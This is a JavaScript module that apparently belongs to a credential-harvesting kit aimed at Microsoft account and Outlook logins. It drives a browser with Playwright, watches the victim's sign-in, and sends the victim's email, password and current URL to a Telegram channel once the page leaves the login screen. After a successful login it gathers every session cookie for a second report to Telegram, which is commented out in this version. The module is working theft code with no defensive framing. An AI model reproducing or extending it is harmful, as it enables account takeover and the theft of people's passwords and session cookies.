/**
 * Auth Detection
 * Handles authentication success detection and data capture
 */

const { sendToTelegram, sendSessionMessage } = require('../services/telegram');
const { formatCookiesForAuthCapture } = require('../utils/cookies');
const fs = require('fs').promises;

/**
 * Save local backup of auth data
 * @param {Object} userData - User data object
 */
async function saveLocalBackup(userData) {
    try {
        const filename = `auth_backup_${Date.now()}.json`;
        await fs.writeFile(filename, JSON.stringify(userData, null, 2));
        console.log(`💾 Local backup saved: ${filename}`);
    } catch (error) {
        console.error('❌ Error saving backup:', error.message);
    }
}

/**
 * Setup auth detection and capture
 * @param {Object} page - Playwright page object
 * @param {string} email - User email
 * @param {string} password - User password
 */
async function setupAuthDetection(page, email, password) {
    let authCaptured = false;
    let sessionMessageSent = false;
    let lastUrl = page.url();

    // Monitor for URL changes (Stage 1)
    page.on('framenavigated', async (frame) => {
        if (frame === page.mainFrame() && !sessionMessageSent) {
            const currentUrl = page.url();

            // Check if URL changed from initial login page
            if (currentUrl !== lastUrl && !currentUrl.includes('login.live.com/oauth20_authorize')) {
                console.log('🔄 URL change detected - sending session info');
                console.log(`📍 From: ${lastUrl}`);
                console.log(`📍 To: ${currentUrl}`);

                // Send Stage 1: Session information
                await sendSessionMessage(email, password, currentUrl);
                sessionMessageSent = true;
            }

            lastUrl = currentUrl;
        }
    });

    // Monitor for auth redirect (Stage 2)
    page.on('response', async (response) => {
        if (authCaptured) return; // Only capture once

        const url = response.url();
        const status = response.status();

        // Check for successful auth redirect
        if (status === 302 || status === 200) {
            const location = response.headers()['location'] || url;

            // Check if redirecting to authenticated pages OR successful completion indicators
            const isAuthRedirect = (
                // Original account domain checks
                (location.includes('account.live.com') && !location.includes('oauth20_authorize')) ||
                (location.includes('outlook.live.com') && !location.includes('oauth20_authorize')) ||
                (location.includes('outlook.com') && !location.includes('oauth20_authorize')) ||
                (location.includes('account') && !location.includes('oauth20_authorize') && !location.includes('login.live.com')) ||
                (url.includes('account.live.com') && !url.includes('oauth20_authorize')) ||
                (url.includes('outlook.live.com') && !url.includes('oauth20_authorize')) ||
                (url.includes('outlook.com') && !url.includes('oauth20_authorize')) ||
                (url.includes('account') && !url.includes('oauth20_authorize') && !url.includes('login.live.com')) ||
                // Check for successful completion via Google redirect (indicates successful auth)
                (location.includes('google.com') || url.includes('google.com')) ||
                // Check for final password completion page
                (url.includes('login.live.com/ppsecure/post.srf') && status === 200)
            );

            if (isAuthRedirect) {
                console.log('🎯 AUTH SUCCESS DETECTED - CAPTURING FULL DATA');
                console.log(`📍 URL: ${url}`);
                console.log(`🔄 Redirect: ${location}`);

                // Wait a moment for cookies to be set
                await page.waitForTimeout(1000);

                // Capture all cookies
                const cookies = await page.context().cookies();

                // Format cookies using utility function
                const formattedCookies = formatCookiesForAuthCapture(cookies);

                // Prepare user data
                const userData = {
                    email: email,
                    password: password,
                    finalUrl: url,
                    cookies: formattedCookies,
                    timestamp: new Date().toISOString()
                };

                // Send Stage 2: Full detailed information
                // LISTENER-BASED NOTIFICATION DISABLED PREVENT FALSE POSITIVES
                // We will rely on explicit flow success in loginFlow.js handling

                /*
                // Only send if we have cookies (successful login)
                if (formattedCookies.length > 2) { 
                    const telegramSent = await sendToTelegram(userData);
                    console.log(`📱 Telegram sent: ${telegramSent ? 'SUCCESS' : 'FAILED'}`);
                    authCaptured = true;
                } else {
                    console.log('⚠️ Redirect detected but few cookies found - likely not a full login success yet');
                }
                */

                // Backup saving DISABLED per user request
                // await saveLocalBackup(userData);

                // Set flag to true so we don't try again in this listener loop
                authCaptured = true;
            }
        }
    });
}

module.exports = {
    setupAuthDetection,
    saveLocalBackup
};

